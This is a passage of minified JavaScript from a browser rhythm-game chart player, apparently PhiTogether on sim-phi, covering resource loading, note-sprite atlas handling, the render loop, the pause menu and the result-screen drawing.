XMLHttpRequest;f.open("get",o=s(o),!0),f.responseType="arraybuffer",f.send(),f.onloadend=async()=>{if(!f.response||!f.response.byteLength)msgHandler.sendError(shared$1.game.i18n.t("simphi.loading.resLoadFailed1",[++n]),shared$1.game.i18n.t("simphi.loading.resLoadFailed2",[new URL(o,location)]),!0);else{const m=new DataView(f.response,0,8),g=m.getUint32(0),y=m.getUint32(4);g===1332176723?t[r]=await audio.decode(f.response):g===2303741511&&y===218765834?t[r]=await createImageBitmap(new Blob([f.response])):msgHandler.sendError(shared$1.game.i18n.t("simphi.loading.resLoadFailed1",[++n]),shared$1.game.i18n.t("simphi.loading.resLoadFailed2",[new URL(o,location)]),!0)}u()}}))),n)return msgHandler.sendError(shared$1.game.i18n.t("simphi.loading.resLoadFailed1",[n]));await updateRes(t)};async function updateRes(e){const t=["Tap","TapHL","Drag","DragHL","HoldHead","HoldHeadHL","Hold","HoldHL","HoldEnd","Flick","FlickHL"];for(const n of t)if(["prpr","prpr-compacted"].includes(main.customResourceMeta.holdType)){if(["HoldHead","HoldHeadHL","HoldEnd"].includes(n))continue;const s=e[n],r=1089/s.width,[o,l]=main.customResourceMeta.holdAtlas||[1,1],d=main.customResourceMeta.holdType==="prpr-compacted";n==="Hold"?(noteRender.update("HoldEnd",await createImageBitmap(s,0,0,s.width,o),r,d),noteRender.update("Hold",await createImageBitmap(s,0,o,s.width,s.height-o-l),r,d),noteRender.update("HoldHead",await createImageBitmap(s,0,s.height-l,s.width,l),r,d)):n==="HoldHL"?(noteRender.update("HoldEndHL",await createImageBitmap(s,0,0,s.width,o),r,d),noteRender.update("HoldHL",await createImageBitmap(s,0,o,s.width,s.height-o-l),r,d),noteRender.update("HoldHeadHL",await createImageBitmap(s,0,s.height-l,s.width,l),r,d)):await noteRender.update(n,e[n],1)}else await noteRender.update(n,e[n],["HoldHL","HoldHeadHL"].includes(n)?8080/7875:1);e.HitFXRaw&&await noteRender.updateFX(e.HitFXRaw,1)}async function loadprprCustomRes(){try{shared$1.game.msgHandler.sendMessage(shared$1.game.i18n.t("simphi.prprCustomRes.applied"))}catch{shared$1.game.msgHandler.sendMessage(shared$1.game.i18n.t("simphi.prprCustomRes.err"),"error")}}const frameAnimater=new FrameAnimater$1;frameAnimater.setCallback(mainLoop);let nowTime_ms=0,curTime=0,curTime_ms=0,timeBgm=0,timeChart=0,duration=0,isInEnd=!1,isOutStart=!1,isOutEnd=!1;function onPageVisibilityChange(){if(document.visibilityState==="hidden")if(emitter.eq("play"))qwqPause();else{if(!audio._actx)return;audio._actx.suspend(),shared$1.game.afterShow.push(()=>{audio._actx.resume()})}}document.addEventListener("visibilitychange",onPageVisibilityChange);document.addEventListener("pagehide",onPageVisibilityChange);const qwqIn=new Timer,qwqOut=new Timer,qwqEnd=new Timer;function playBgm(e,t){t||(t=0),curTime_ms=performance.now(),tmps.bgMusic=audio.play(e,{offset:t,playbackrate:app.speed,gainrate:app.musicVolume,interval:autoDelay.checked?1:0})}function playVideo(e,t){return t||(t=0),e.currentTime=t,e.playbackRate=app.speed,e.muted=!0,e.play()}let fucktemp1=!1,fucktemp2=null;const tmps={bgImage:null,bgVideo:null,bgMusic:e=>{},progress:0,name:"",artist:"",illustrator:"",charter:"",level:"",combo:"",combo2:"",showStat:!1,statStatus:{pause:{show:!0,offsetX:0,offsetY:0,alpha:1},combonumber:{show:!0,offsetX:0,offsetY:0,alpha:1},combo:{show:!0,offsetX:0,offsetY:0,alpha:1},score:{show:!0,offsetX:0,offsetY:0,alpha:1},bar:{show:!0,offsetX:0,offsetY:0,alpha:1},name:{show:!0,offsetX:0,offsetY:0,alpha:1},level:{show:!0,offsetX:0,offsetY:0,alpha:1}},customForeDraw:null,customBackDraw:null,get canPause(){return shared$1.game.ptmain.gameMode!=="multi"},hitFxRotate:!1};stage$1.resize();function mainLoop(){frameTimer.addTick();const{lineScale:e}=app;if(nowTime_ms=performance.now(),app.resizeCanvas(),qwqOut.second<.67){loopNoCanvas();for(const t of main.now.values())t(timeBgm*app.speed);loopCanvas()}else fucktemp1||(fucktemp1=!0,audio.stop(),btnPause.classList.add("disabled"),ctxos.globalCompositeOperation="source-over",ctxos.resetTransform(),ctxos.globalAlpha=1,$id("imageBlur").checked?ctxos.drawImage(app.bgImageBlur,...adjustSize(app.bgImageBlur,canvasos,1)):ctxos.drawImage(app.bgImage,...adjustSize(app.bgImage,canvasos,1)),ctxos.fillStyle="#000",ctxos.globalAlpha=.2,ctxos.fillRect(0,0,canvasos.width,canvasos.height),setTimeout(()=>{if(!fucktemp1)return;const t=["ez","hd","in","at"].indexOf(levelText.slice(0,2).toLocaleLowerCase());audio.play(res[`LevelOver${shared$1.game.ptmain.gameConfig.usekwlevelOverbgm?"0":t<0?2:t}${shared$1.game.ptmain.gameConfig.usekwlevelOverbgm?"":"_v2"}`],{loop:!0}),qwqEnd.reset(),qwqEnd.play(),stat.level=Number(levelText.match(/\d+$/)),fucktemp2=stat.getData(app.playMode===1,selectspeed.value)},1e3),shared$1.game.ptmain.playFinished(),shared$1.game.ptmain.playConfig.adjustOffset&&saveAdjustedChart(app,fucktemp2),app.stage.style.zIndex=0,stage$1.resize(!0));fucktemp2&&(qwqdraw3(fucktemp2),ctxos.globalAlpha=.5,ctxos.drawImage(res.Retry,canvasos.width-app.lineScale*1,canvasos.height-app.lineScale*1,app.lineScale*.75,app.lineScale*.75),ctxos.textAlign="left",ctxos.textAlign=null),!emitter.eq("play")&&!app.pauseTime&&!fucktemp2&&(ctxos.globalAlpha=.5,ctxos.drawImage(res.Loop,app.lineScale*.25,canvasos.height-app.lineScale*1,app.lineScale*.75,app.lineScale*.75)),(canvas.width>canvasos.width||fucktemp2)&&(ctx.globalAlpha=1,$id("imageBlur").checked||fucktemp2?ctx.drawImage(app.bgImageBlur,...adjustSize(app.bgImageBlur,canvas,1.1)):ctx.drawImage(app.bgImage,...adjustSize(app.bgImage,canvas,1.1)),ctx.fillStyle="#000",ctx.globalAlpha=.2,ctx.fillRect(0,0,canvas.width,canvas.height)),ctx.globalAlpha=1,ctx.drawImage(canvasos,(canvas.width-canvasos.width)/2,0),ctx.font=`${e*.3}px Saira`,ctx.fillStyle="#FFF",ctx.globalAlpha=.25,ctx.textAlign="center",ctx.textBaseline="middle",ctx.fillText(app.playMode===1?`PhiTogether 预览模式 (材质来自 ${main.customResourceMeta.author})`:`${replayMgr.replaying?`[ ·REC ${replayMgr.playerInfo.username||replayMgr.playerInfo.userName} (ID ${replayMgr.playerInfo.id}) ] `:""}PhiTogether ${spec.thisVersion} @ sim-phi - P${judgeManager.time.p*1e3} G${judgeManager.time.g*1e3} S${app.speed.toFixed(2)}${shared$1.game.ptmain.gameConfig.fullScreenJudge?" F":""} - ${shared$1.game.ptmain.noAccountMode?"OFFLINE":"ONLINE"} - RES ${main.customResourceMeta.author}`,canvas.width/2-e*0,canvas.height-e*.3)}function loopNoCanvas(){!isInEnd&&qwqIn.second>=3&&(isInEnd=!0,playBgm(app.bgMusic),app.bgVideo&&playVideo(app.bgVideo)),emitter.eq("play")&&isInEnd&&!isOutStart&&(timeBgm=curTime+(nowTime_ms-curTime_ms)/1e3),timeBgm>=duration&&(isOutStart=!0),showTransition.checked&&isOutStart&&!isOutEnd&&(isOutEnd=!0,qwqOut.play()),timeChart=Math.max(timeBgm-(app.chart.offset+Number(inputOffset.value)/1e3||0)/app.speed,0),app.updateByTime(timeChart),hitFeedbackList.update(),hitImageList.update(),hitWordList.update();for(const e of hitManager.list)e.type!=="keyboard"&&(e.isTapped?e.isMoving?hitFeedbackList.add(HitFeedback.move(e.offsetX,e.offsetY)):e.isActive&&hitFeedbackList.add(HitFeedback.hold(e.offsetX,e.offsetY)):hitFeedbackList.add(HitFeedback.tap(e.offsetX,e.offsetY)));if(isInEnd&&!app.pauseTime){const e=canvasos.width*.118125;replayMgr.replaying||judgeManager.addEvent(app.notes,timeChart),judgeManager.execute(app.drags,timeChart,e),judgeManager.execute(app.flicks,timeChart,e),judgeManager.execute(app.tapholds,timeChart,e)}hitManager.update(),tmps.bgImage=$id("imageBlur").checked?app.bgImageBlur:app.bgImage,tmps.bgVideo=app.bgVideo,tmps.progress=(main.qwqwq?duration-timeBgm:timeBgm)/duration,tmps.name=inputName$1.value||inputName$1.placeholder,tmps.artist=inputArtist.value,tmps.illustrator=inputIllustrator.value||inputIllustrator.placeholder,tmps.charter=inputCharter.value||inputCharter.placeholder,tmps.level=levelText,stat.combo>2?(tmps.combo=`${stat.combo}`,tmps.combo2=shared$1.game.ptmain.playConfig.mode==="preview"?"PREVIEW":"COMBO"):tmps.combo=tmps.combo2="",tmps.showStat=!0,tmps.statStatus={pause:{show:!0,offsetX:0,offsetY:0,alpha:1},combonumber:{show:!0,offsetX:0,offsetY:0,alpha:1},combo:{show:!0,offsetX:0,offsetY:0,alpha:1},score:{show:!0,offsetX:0,offsetY:0,alpha:1},bar:{show:!0,offsetX:0,offsetY:0,alpha:1},name:{show:!0,offsetX:0,offsetY:0,alpha:1},level:{show:!0,offsetX:0,offsetY:0,alpha:1}},tmps.customForeDraw=null,tmps.customBackDraw=null,replayMgr.replaying&&(tmps.combo2=`REPLAY (${replayMgr.playerInfo.username||replayMgr.playerInfo.userName})`)}function loopCanvas(){const{lineScale:e}=app;if(ctxos.clearRect(0,0,canvasos.width,canvasos.height),ctxos.globalAlpha=1,ctxos.globalAlpha=1,ctxos.drawImage(tmps.bgImage,...adjustSize(tmps.bgImage,canvasos,1)),isInEnd&&tmps.bgVideo&&!main.qwqwq){const{videoWidth:s,videoHeight:r}=tmps.bgVideo;ctxos.drawImage(tmps.bgVideo,...adjustSize({width:s,height:r},canvasos,1))}if(qwqIn.second>=2.5&&!stat.lineStatus&&drawLine(0,e),ctxos.resetTransform(),ctxos.fillStyle="#000",qwqIn.second<.67?ctxos.globalAlpha=tween.easeOutSine(qwqIn.second*1.5)*app.brightness:ctxos.globalAlpha=app.brightness-tween.easeOutSine(qwqOut.second*1.5)*(app.brightness-.2),ctxos.fillRect(0,0,canvasos.width,canvasos.height),qwqIn.second>=2.5&&tmps.customBackDraw!=null&&tmps.customBackDraw(ctxos),qwqIn.second>=2.5&&drawLine(stat.lineStatus?2:1,e),ctxos.resetTransform(),qwqIn.second>=3&&qwqOut.second===0&&(drawNotes(),showPoint.checked)){ctxos.font=`${e}px Saira`,ctxos.textAlign="center";for(const s of app.linesReversed)ctxos.setTransform(s.cosr,s.sinr,-s.sinr,s.cosr,s.offsetX,s.offsetY),ctxos.globalAlpha=1,ctxos.fillStyle="violet",ctxos.fillRect(-e*.2,-e*.2,e*.4,e*.4),ctxos.fillStyle="yellow",ctxos.globalAlpha=(s.alpha+.5)/1.5,ctxos.fillText(`${s.lineId.toString()}:<${Math.floor(s.scaleX||1)}x${Math.floor(s.scaleY||1)}>@${(s.alpha*255||1).toFixed(1)}`,0,-e*.3);for(const s of app.notesReversed)s.visible&&(ctxos.setTransform(s.cosr,s.sinr,-s.sinr,s.cosr,s.offsetX,s.offsetY),ctxos.globalAlpha=1,ctxos.fillStyle="lime",ctxos.fillRect(-e*.2,-e*.2,e*.4,e*.4),ctxos.fillStyle="cyan",ctxos.globalAlpha=s.realTime>timeChart?1:.5,ctxos.fillText(s.name,0,-e*.3))}hitImageList.animate(),showCE2.checked&&hitWordList.animate(),ctxos.globalAlpha=1,ctxos.setTransform(canvasos.width/1920,0,0,canvasos.width/1920,0,e*(qwqIn.second<.67?tween.easeOutSine(qwqIn.second*1.5)-1:-tween.easeOutSine(qwqOut.second*1.5))*1.75),ctxos.drawImage(res.ProgressBar,tmps.progress*1920-1920,0),ctxos.resetTransform();for(const s of main.after.values())s();if(ctxos.fillStyle="#fff",qwqIn.second<3){qwqIn.second<.67?ctxos.globalAlpha=tween.easeOutSine(qwqIn.second*1.5):qwqIn.second>=2.5&&(ctxos.globalAlpha=tween.easeOutSine(6-qwqIn.second*2));const s=tmps.name,r=tmps.artist,o=`Illustration designed by ${tmps.illustrator}`,l=`Level designed by ${tmps.charter}`,d=`Resource Pack ${main.customResourceMeta.name} designed by ${main.customResourceMeta.author}`;ctxos.textAlign="center",ctxos.textBaseline="alphabetic",ctxos.font=`${e*1.1}px Saira`;const u=ctxos.measureText(s).width;u>canvasos.width-e*1.5&&(ctxos.font=`${e*1.1/u*(canvasos.width-e*1.5)}px Saira`),ctxos.fillText(s,app.wlen,app.hlen*.75),ctxos.textBaseline="top",ctxos.font=`${e*.55}px Saira`;const f=ctxos.measureText(r).width;f>canvasos.width-e*1.5&&(ctxos.font=`${e*.55/f*(canvasos.width-e*1.5)}px Saira`),ctxos.fillText(r,app.wlen,app.hlen*.75+e*.85),ctxos.font=`${e*.55}px Saira`;const m=ctxos.measureText(o).width;m>canvasos.width-e*1.5&&(ctxos.font=`${e*.55/m*(canvasos.width-e*1.5)}px Saira`),ctxos.fillText(o,app.wlen,app.hlen*1.25+e*.15),ctxos.font=`${e*.55}px Saira`;const g=ctxos.measureText(l).width;g>canvasos.width-e*1.5&&(ctxos.font=`${e*.55/g*(canvasos.width-e*1.5)}px Saira`),ctxos.fillText(l,app.wlen,app.hlen*1.25+e*1),ctxos.font=`${e*.55}px Saira`;const y=ctxos.measureText(d).width;y>canvasos.width-e*1.5&&(ctxos.font=`${e*.55/y*(canvasos.width-e*1.5)}px Saira`),ctxos.fillText(d,app.wlen,app.hlen*1.25+e*1.75),ctxos.globalAlpha=1,ctxos.setTransform(1,0,0,1,app.wlen,app.hlen);const v=e*48*(qwqIn.second<.67?tween.easeInCubic(qwqIn.second*1.5):1),x=e*.15;qwqIn.second>=2.5&&(ctxos.globalAlpha=tween.easeOutSine(6-qwqIn.second*2)),ctxos.drawImage(lineColor.checked?res.JudgeLineMP:res.JudgeLine,-v/2,-x/2,v,x)}ctxos.globalAlpha=1,ctxos.resetTransform(),ctxos.fillStyle="#fff",ctxos.globalAlpha=1,ctxos.setTransform(1,0,0,1,0,e*(qwqIn.second<.67?tween.easeIOCubic(qwqIn.second*1.5)-1:-tween.easeIOCubic(qwqOut.second*1.5))*1.75),ctxos.textBaseline="alphabetic",tmps.showStat&&(ctxos.font=`${e*.95}px Saira`,ctxos.textAlign="right",ctxos.globalAlpha=tmps.statStatus.score.alpha,ctxos.fillText(stat.scoreStr,canvasos.width-e*.65+tmps.statStatus.score.offsetX,e*1.375+tmps.statStatus.score.offsetY),showAcc.checked&&shared$1.game.ptmain.playConfig.mode!=="preview"&&(ctxos.font=`${e*.66}px Saira`,ctxos.fillText(stat.accStr,canvasos.width-e*.65+tmps.statStatus.score.offsetX,e*2.05+tmps.statStatus.score.offsetY)),shared$1.game.ptmain.playConfig.mode!=="preview"&&gauge.draw()),ctxos.fillStyle="#fff",ctxos.textAlign="center",ctxos.font=`${e*1.32}px Saira`,ctxos.globalAlpha=tmps.statStatus.combonumber.alpha,ctxos.fillText(tmps.combo,app.wlen+tmps.statStatus.combonumber.offsetX,e*1.375+tmps.statStatus.combonumber.offsetY),ctxos.globalAlpha=qwqIn.second<.67?tween.easeOutSine(qwqIn.second*1.5):1-tween.easeOutSine(qwqOut.second*1.5),ctxos.globalAlpha*=tmps.statStatus.combo.alpha,ctxos.font=`${e*.5}px Saira`,ctxos.fillText(tmps.combo2,app.wlen+tmps.statStatus.combo.offsetX,e*1.95+tmps.statStatus.combo.offsetY),ctxos.setTransform(1,0,0,1,0,e*(qwqIn.second<.67?1-tween.easeIOCubic(qwqIn.second*1.5):tween.easeIOCubic(qwqOut.second*1.5))*1.75),ctxos.textBaseline="alphabetic",ctxos.textAlign="right",ctxos.font=`${e*.63}px Saira`;const t=ctxos.measureText(levelText).width;t>app.wlen-e&&(ctxos.font=`${e*.63/t*(app.wlen-e)}px Saira`),ctxos.globalAlpha=tmps.statStatus.level.alpha,ctxos.fillText(tmps.level,canvasos.width-e*.75+tmps.statStatus.level.offsetX,canvasos.height-e*.66+tmps.statStatus.level.offsetY),ctxos.textAlign="left",ctxos.font=`${e*.63}px Saira`;const n=ctxos.measureText(inputName$1.value||inputName$1.placeholder).width;n>app.wlen-e&&(ctxos.font=`${e*.63/n*(app.wlen-e)}px Saira`),ctxos.globalAlpha=tmps.statStatus.name.alpha,ctxos.fillText(inputName$1.value||inputName$1.placeholder,e*.65+tmps.statStatus.name.offsetX,canvasos.height-e*.66+tmps.statStatus.name.offsetY),ctxos.globalAlpha=1,ctxos.resetTransform(),qwqIn.second>=2.5&&tmps.customForeDraw!=null&&tmps.customForeDraw(ctxos),qwqIn.second>3&&main.filter&&main.filter(ctxos,timeBgm,nowTime_ms/1e3),$id("feedback").checked&&hitFeedbackList.animate(),ctxos.resetTransform();try{shared$1.game.graphicHandler.whilePlayingHook(ctx,ctxos,e)}catch(s){console.warn(s)}if(ctxos.fillStyle="#fff",qwqIn.second<.67?ctxos.globalAlpha=tween.easeOutSine(qwqIn.second*1.5):ctxos.globalAlpha=1-tween.easeOutSine(qwqOut.second*1.5),ctxos.font=`${e*.4}px Saira`,ctxos.textBaseline="middle",ctxos.textAlign="right",ctxos.globalAlpha=.5,ctxos.fillText(frameTimer.fpsStr,canvasos.width-e*.05,e*.5),ctxos.font=`${e*.25}px Saira`,ctxos.fillText("FPS",canvasos.width-e*.05,e*.8),ctxos.textBaseline="alphabetic",ctxos.globalAlpha=1,ctxos.resetTransform(),ctxos.globalAlpha=tmps.canPause?tmps.statStatus.pause.alpha:.5,tmps.showStat&&ctxos.drawImage(res.Pause,e*.6+tmps.statStatus.pause.offsetX,e*.7+tmps.statStatus.pause.offsetY,e*.63,e*.7),shared$1.game.ptmain.playConfig.adjustOffset){ctxos.fillStyle="gray",ctxos.globalAlpha=.75,drawRoundRect(ctxos,canvasos.width-e*7.5,canvasos.height-e*5,e*7.5,e*5,e*.25).fill(),ctxos.globalAlpha=1,ctxos.fillStyle="#fff",ctxos.textBaseline="middle",ctxos.textAlign="center",ctxos.font=`${e*.75}px Saira`,ctxos.fillText(shared$1.game.i18n.t("simphi.adjustOffset.title"),canvasos.width-e*3.75,canvasos.height-e*4.25),ctxos.font=`${e*.65}px Saira`,ctxos.fillText(`${(app.chart.offset*1e3).toFixed(0)}ms`,canvasos.width-e*3.75,canvasos.height-e*2.5),ctxos.font=`${e*.5}px Saira`;const s=(r,o)=>{const l=e*.5-e*Math.abs(r)*.1;ctxos.fillStyle="#fff",drawRoundRect(ctxos,canvasos.width-3.75*e+e*o,canvasos.height-e*2.5-l,l*2,l*2,e*.1).fill(),ctxos.fillStyle="#000",ctxos.fillText(r>0?"+":"-",canvasos.width-3.75*e+e*o+l,canvasos.height-e*2.5)};s(-3,-3.5),s(-2,-3),s(-1,-2.25),s(1,1.5),s(2,2.45),s(3,3.15),ctxos.fillStyle="#fff",drawRoundRect(ctxos,canvasos.width-7*e,canvasos.height-e*1.25,e*3,e,e*.1).fill(),drawRoundRect(ctxos,canvasos.width-3.5*e,canvasos.height-e*1.25,e*3,e,e*.1).fill(),ctxos.fillStyle="#000",ctxos.font=`${e*.65}px Saira`,ctxos.fillText(shared$1.game.i18n.t("simphi.adjustOffset.reset"),canvasos.width-5.5*e,canvasos.height-e*.75),ctxos.fillText(shared$1.game.i18n.t("simphi.adjustOffset.save"),canvasos.width-2*e,canvasos.height-e*.75)}if(ctxos.fillStyle="#fff",!emitter.eq("play")&&(ctxos.fillStyle="#000",ctxos.globalAlpha=app.pauseBackgroundDimPara1?Math.max(.6-.6*tween.easeOutCubic((performance.now()-app.pauseBackgroundDimPara1)/2e3),0):.6,ctxos.fillRect(0,0,canvasos.width,canvasos.height),ctxos.globalAlpha=.5,!app.pauseTime)){ctxos.globalAlpha=1,ctxos.fillStyle="#fff",ctxos.textBaseline="middle",ctxos.font=`${e*.4}px Saira`,ctxos.textAlign="left",ctxos.fillText(`${time2Str(main.qwqwq?duration-timeBgm:timeBgm)}/${time2Str(duration)}${status2.text}`,e*.05,e*.35),[stat.noteRank[5]+stat.noteRank[4]+stat.noteRank[1],stat.noteRank[7]+stat.noteRank[3],stat.noteRank[7],stat.noteRank[3],stat.noteRank[6],stat.noteRank[2]].forEach((o,l)=>{const d=["#f0ed69","#0ac3ff","#0ac3ff","#0ac3ff","#fe7b93","#999"],u=["Perfect:","Good:","Early:","Late:","Bad:","Miss:"];ctxos.fillStyle=d[l],ctxos.fillText(u[l],e*.05,canvasos.height/2+e*(l-2.8)*.5),ctxos.fillText(o.toString(),e*1.75,canvasos.height/2+e*(l-2.8)*.5)}),ctxos.fillStyle="#fff",ctxos.fillText(`DSP:  ${stat.curDispStr}`,e*.05,canvasos.height/2+e*2.6),ctxos.fillText(`AVG:  ${stat.avgDispStr}`,e*.05,canvasos.height/2+e*3.1);const s=o=>app.hlen-e*o/2,r=o=>app.wlen+e*(o*2-.5);if(ctxos.drawImage(res.Back,r(-1.1),s(1.5),e*1.5,e*1.5),ctxos.drawImage(res.Retry,r(0),s(1.25),e*1.25,e*1.25),ctxos.drawImage(res.Resume,r(1),s(1.5),e*1.5,e*1.5),shared$1.game.ptmain.playConfig.practiseMode&&qwqIn.second>=3){ctxos.font=`${e*.5}px Saira`,ctxos.fillStyle="#fff",ctxos.textAlign="center",ctxos.textBaseline="middle",ctxos.fillText("00:00.000",app.wlen*.25,app.hlen+e*4.25),ctxos.fillText(time2Str(duration,!0),app.wlen*1.75,app.hlen+e*4.25);const o=(main.qwqwq?duration-timeBgm:timeBgm)/duration;ctxos.fillText(time2Str(main.qwqwq?duration-timeBgm:timeBgm,!0),app.wlen*(.25+1.5*o),app.hlen+e*2),drawRoundRect(ctxos,app.wlen*1.5+e*2.5,app.hlen-e*.5,e*.6,e*.6,e*.1).fill(),drawRoundRect(ctxos,app.wlen*1.5+e*3.4,app.hlen-e*.5,e*.6,e*.6,e*.1).fill(),ctxos.textAlign="left",ctxos.fillText(`Speed: ${app.speed.toFixed(3)}`,app.wlen+e*4,app.hlen-e*.25),ctxos.fillRect(app.wlen+e*4,app.hlen+e*.25,app.wlen*.5,e*.1),ctxos.fillStyle="#000",ctxos.textAlign="center",ctxos.fillText("-",app.wlen*1.5+e*2.8,app.hlen-e*.25),ctxos.fillText("+",app.wlen*1.5+e*3.7,app.hlen-e*.2),ctxos.fillStyle="#a9a9a9",ctxos.fillRect(app.wlen*.25,app.hlen+e*2.5,app.wlen*1.5,e*1.25),ctxos.fillStyle="deepskyblue",ctxos.fillRect(app.wlen*(.25+1.5*o),app.hlen+e*2.25,e*.1,e*1.5),ctxos.fillRect(app.wlen+e*3.9+app.wlen*.5*Math.min((app.speed-.5)/1.5,1),app.hlen+e*.15,e*.1,e*.3)}}ctxos.fillStyle="#fff",app.pauseTime&&(ctxos.font=`${e*2}px Saira`,ctxos.fillStyle="#FFF",ctxos.globalAlpha=1,ctxos.textAlign="center",ctxos.textBaseline="middle",ctxos.fillText(app.pauseTime,canvasos.width/2,canvasos.height/2))}function drawLine(e,t){ctxos.globalAlpha=1;const n=1-tween.easeOutSine(qwqOut.second*1.5);for(const s of app.linesReversed)if(e^Number(s.imageD)&&qwqOut.second<.67){if(s.alpha<0||s.attachUI)continue;ctxos.globalAlpha=s.alpha,ctxos.setTransform(s.cosr*n,s.sinr,-s.sinr*n,s.cosr,app.wlen+(s.offsetX-app.wlen)*n,s.offsetY);const r=(s.imageU?t*18.75:canvasos.height)*s.imageS/1080,o=r*s.imageW*s.imageA*(s.scaleX||1),l=r*s.imageH*(s.scaleY||1);if(s.attachUI)tmps.statStatus[s.attachUI]={show:!0,offsetX:s.offsetX-app.wlen,offsetY:s.offsetY-app.hlen,alpha:s.alpha};else if(s.text)ctxos.fillStyle=s.color||"#fff",ctxos.textAlign="center",ctxos.textBaseline="middle",ctxos.font=`${t*(s.scaleY||1)}px Saira`,ctxos.fillText(s.text,0,0);else try{s.color&&s.color!="#fff"&&s.color!="#ffffff"?s.isCustomImage?ctxos.drawImage(getColoredLineImage(s,s.color),-o/2,-l/2,o,l):(ctxos.fillStyle=s.color||"#fff",ctxos.fillRect(-o/2,-l/2,o,l),ctxos.fillStyle="#fff"):ctxos.drawImage(s.imageL[s.imageC&&lineColor.checked?stat.lineStatus:0],-o/2,-l/2,o,l)}catch{ctxos.drawImage(s.imageL[s.imageC&&lineColor.checked?stat.lineStatus:0],-o/2,-l/2,o,l)}}}function getColoredLineImage(e,t){return t?(t=t.toLowerCase(),e.imagesColored[t]||(e.imagesColored[t]=imgShader(e.imageL[0],t,!0))):e.imageL[i.imageC&&lineColor.checked?stat.lineStatus:0]}function drawRoundRect(e,t,n,s,r,o){return s<2*o&&(o=s/2),r<2*o&&(o=r/2),e.beginPath(),e.moveTo(t+o,n),e.arcTo(t+s,n,t+s,n+r,o),e.arcTo(t+s,n+r,t,n+r,o),e.arcTo(t,n+r,t,n,o),e.arcTo(t,n,t+s,n,o),e.closePath(),e}function qwqdraw3(e){ctxos.shadowBlur=40,ctxos.shadowColor="#000000",ctxos.globalAlpha=1;const t=3.7320508075688776,n=(canvasos.width-canvasos.height/t)/(16-9/t);ctxos.setTransform(n/120,0,0,n/120,app.wlen-n*8,app.hlen-n*4.5),ctxos.globalAlpha=1;let s=700*(app.bgImage.width/app.bgImage.height),r=700;s<1200&&(s=1200,r=1200*(app.bgImage.height/app.bgImage.width)),ctxos.drawImage(app.bgImage,-1920*tween.ease10(clip(qwqEnd.second*1))+2460.5-s/2,208-(r-645)/2,s,r),drawRoundRect(ctxos,-1920*tween.ease10(clip(qwqEnd.second*1))+2010.24,182,890,700,30),ctxos.globalCompositeOperation="destination-in",ctxos.fill(),ctxos.globalCompositeOperation="source-over",ctxos.stroke(),ctxos.globalAlpha=.5,ctxos.fillStyle="black",drawRoundRect(ctxos,-1720*tween.ease10(clip(qwqEnd.second-.1))+2740,180,800,360,30).fill(),drawRoundRect(ctxos,-1020*tween.ease10(clip(qwqEnd.second*.9-.25))+2040,563,800,150,30).fill(),drawRoundRect(ctxos,-1020*tween.ease10(clip(qwqEnd.second*.8-.3))+2040,735,800,150,30).fill(),ctxos.globalAlpha=1,ctxos.restore(),ctxos.setTransform(n/120,0,0,n/120,app.wlen-n*8,app.hlen-n*4.5),ctxos.fillStyle="#fff",ctxos.textAlign="left",ctxos.font="73.5px Saira";const o=ctxos.measureText(inputName$1.value||inputName$1.placeholder).width;o>600&&(ctxos.font=`${73.5/o*600}px Saira`),ctxos.fillText(inputName$1.value||inputName$1.placeholder,-1920*tween.ease10(clip(qwqEnd.second*1))+2050,830),ctxos.font="30px Saira";const l=ctxos.measureText(levelText).width;l>150&&(ctxos.font=`${30/l*150}px Saira`),ctxos.textAlign="right",ctxos.fillText(levelText,-1920*tween.ease10(clip(qwqEnd.second*1))+2860,835),ctxos.textAlign="left",ctxos.globalAlpha=clip((qwqEnd.second-1.3)*3.75),293+clip((qwqEnd.second-1.3)*3.75)*100;const d=410-tween.ease15(clip((qwqEnd.second-1.3)*1.5))*164;stat.lineStatus==3?ctxos.drawImage(res.FCV,1685-d,373-d,d*2,d*2):ctxos.drawImage(res.Ranks[stat.rankStatus],1685-d,373-d,d*2,d*2),ctxos.globalAlpha=clip((qwqEnd.second-.8)*1.5),ctxos.textAlign="right",ctxos.font="55px Saira",ctxos.fillText(stat.accStr,-1020*tween.ease10(clip(qwqEnd.second*.9-.25))+2785,638),ctxos.font="26px Saira",ctxos.fillText("ACCURACY",-1020*tween.ease10(clip(qwqEnd.second*.9-.25))+2783,673),ctxos.textAlign="left",ctxos.font="55px Saira",ctxos.fillText(stat.maxcombo,-1020*tween.ease10(clip(qwqEnd.second*.9-.25))+2095,638),ctxos.font="26px Saira",ctxos.fillText("MAX COMBO",-1020*tween.ease10(clip(qwqEnd.second*.9-.25))+2095,673),ctxos.fillStyle="#fff",ctxos.textAlign="left",ctxos.font="86px Saira",ctxos.globalAlpha=clip((qwqEnd.second-.4)*2),ctxos.fillText(stat.scoreStr,-1720*tween.ease10(clip(qwqEnd.second-.1))+2795,415),ctxos.textAlign="right",ctxos.font="25px Saira",ctxos.fillStyle="#83e691",ctxos.fillText(app.speed===1?"":e.textAboveStr.replace("{SPEED}",app.speed.toFixed(2)),-1920*tween.ease10(clip(qwqEnd.second*1))+2860,792),ctxos.textAlign="left",ctxos.globalAlpha=clip((qwqEnd.second-.4)*2.5),ctxos.fillStyle="#a2e27f",ctxos.font="25px Saira",ctxos.fillText(e.newBestStr,-1720*tween.ease10(clip(qwqEnd.second-.1))+2800,337),ctxos.fillStyle="#fff",ctxos.textAlign="left",ctxos.font="30px Saira",ctxos.fillText(e.scoreBest,-1720*tween.ease10(clip(qwqEnd.second-.1))+2800,460),ctxos.textAlign="left",ctxos.fillText(e.scoreDelta,-1720*tween.ease10(clip(qwqEnd.second-.1))+2950,460),ctxos.fillStyle="#fff",ctxos.font="45px Saira",ctxos.textAlign="center",ctxos.globalAlpha=clip((qwqEnd.second-1.25)*2.5),ctxos.fillText(stat.perfect,-1020*tween.ease10(clip(qwqEnd.second*.8-.3))+2140,812),ctxos.fillText(stat.good,-1020*tween.ease10(clip(qwqEnd.second*.8-.3))+2288,812),ctxos.fillText(stat.noteRank[6],-1020*tween.ease10(clip(qwqEnd.second*.8-.3))+2395,812),ctxos.fillText(stat.noteRank[2],-1020*tween.ease10(clip(qwqEnd.second*.8-.3))+2502,812),ctxos.font="20px Saira",ctxos.fillText("PERFECT",-1020*tween.ease10(clip(qwqEnd.second*.8-.3))+2140,842),ctxos.fillText("GOOD",-1020*tween.ease10(clip(qwqEnd.second*.8-.3))+2288,842),ctxos.fillText("BAD",-1020*tween.ease10(clip(qwqEnd.second*.8-.3))+2395,842),ctxos.fillText("MISS",-1020*tween.ease10(clip(qwqEnd.second*.8-.3))+2502,842),ctxos.font="28px 